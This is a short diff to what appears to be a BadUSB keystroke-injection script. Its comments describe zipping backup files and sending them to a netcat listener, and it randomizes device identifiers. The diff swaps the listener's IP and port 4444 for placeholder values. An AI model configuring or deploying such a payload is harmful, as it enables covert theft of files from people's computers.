@@ -5,8 +5,8 @@ REM              compresses the backup files into a .ZIP, sends the .ZIP file to
 REM              and then exits PowerShell.
 
 REM Change IP and PORT variables according to the netcat listener.
-DEFINE #IP 10.0.0.86
-DEFINE #PORT 4444
+DEFINE #IP 0.0.0.0
+DEFINE #PORT 0000
 
 REM Randomizes device identifiers.
 VID_RANDOM
